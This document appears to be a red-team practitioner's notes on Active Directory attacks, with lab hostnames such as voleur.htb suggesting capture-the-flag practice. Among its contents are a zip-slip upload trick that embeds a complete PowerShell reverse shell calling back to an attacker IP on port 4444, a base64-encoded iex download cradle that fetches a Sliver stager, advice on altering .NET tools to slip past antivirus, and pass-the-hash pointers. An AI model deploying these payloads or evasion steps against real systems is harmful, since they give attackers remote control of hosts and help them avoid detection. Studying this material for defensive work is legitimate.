
**On a Domain Controller, Local Admin = Domain Admin**, because **DCs don't have a separate local SAM database** — all privileges are managed by AD.

---
Only hashes from `ntds.dit` can be used in the PTH attack (can be aquired from DCSync or volume shadow copy from the DC). Any other NTLM has is net-NTLM that is created on the fly (challenge-response) and it can be used for relaying

---
.NET tools like [SharpCollection](https://github.com/Flangvik/SharpCollection) is so easy to be detected by ADR,AV so in a red team engagement we need to change all the variables so it didn't get detected by them

---
Check if there is a deleted user:
```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List
```

restore it:
```
Restore-ADObject -Identity 'f80369c8-96a2-4a7f-a56c-9c15edd7d1e3'
```

---
connecting to evil-winrm with ticket:
```
 evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
```

***
zip slip:
```
zip benign.zip legit.pdf
mkdir malicious_files
cd malicious_files
nano shell.php

<?php shell_exec("powershell -nop -w hidden -c \"\$client = New-Object System.Net.Sockets.TCPClient('YOURIP',4444); \$stream = \$client.GetStream(); [byte[]]\$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){; \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i); \$sendback = (iex \$data 2>&1 | Out-String ); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()}; \$client.Close()\""); ?>

zip -r malicious.zip malicious_files/

cat benign.zip malicious.zip > combined.zip

then upload combined.zip after u go to url change legit.pdf to malicious_files/shell.php 
nc -nlvp 4444
```

---
-dc-ip should be applied whenever using -k , the full fqdn 

> DC host (-dc-host) not specified and Kerberos authentication is used. This might fail

---
shell autocomplete:
```bash
rlwrap -cAr nc -lvnp 4444
```

---
### Ticktes for SPNs and its uses

| SPN                   | Protocol / Service                                                | Common tool / usage                                                                           |
| --------------------- | ----------------------------------------------------------------- | --------------------------------------------------------------------------------------------- |
| `HTTP/dc01.lol.local` | HTTP service (IIS, WinRM over HTTPS)                              | WinRM, PowerShell Remoting (`Enter-PSSession`)                                                |
| `HOST/dc01.lol.local` | Generic host service (all host services, for Kerberos delegation) | Used in delegation scenarios; also picked up by S4U2Proxy or generic Kerberos tools (`winrs`) |
| `CIFS/dc01.lol.local` | SMB / file shares                                                 | PsExec, SMB-based lateral movement, `net use \\dc01\C$`                                       |

---

cool way to get info out of `CHALLENGE_MESSAGE` in `smb` challenge-response:
```bash
└─$ impacket-DumpNTLMInfo 10.10.111.10
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Defaulting to SMB protocol.
[*] Using target: 10.10.111.10, IP: 10.10.111.10, Port: 445, Protocol: SMB
[+] SMBv1 Enabled   : False
[+] Prefered Dialect: SMB 3.0
[+] Server Security : SIGNING_ENABLED | SIGNING_REQUIRED
[+] Max Read Size   : 8.0 MB (8388608 bytes)
[+] Max Write Size  : 8.0 MB (8388608 bytes)
[+] Current Time    : 2025-09-03 20:34:55.075979+00:00
[+] Name            : DC01
[+] Domain          : LOL
[+] DNS Tree Name   : lol.local
[+] DNS Domain Name : lol.local
[+] DNS Host Name   : DC01.lol.local
[+] OS              : 
```

---

By default, PowerShell uses UTF-16LE as encoding, but that is not always the case, so we must convert our payload to Base64 using the UTF-16LE encoding.
```powershell
echo -en "iex(new-object net.webclient).downloadString('http://10.10.14.62:8088/stager.txt')" | iconv -t UTF-16LE | base64 -w 0
```
this can be utilized with [[Sliver]]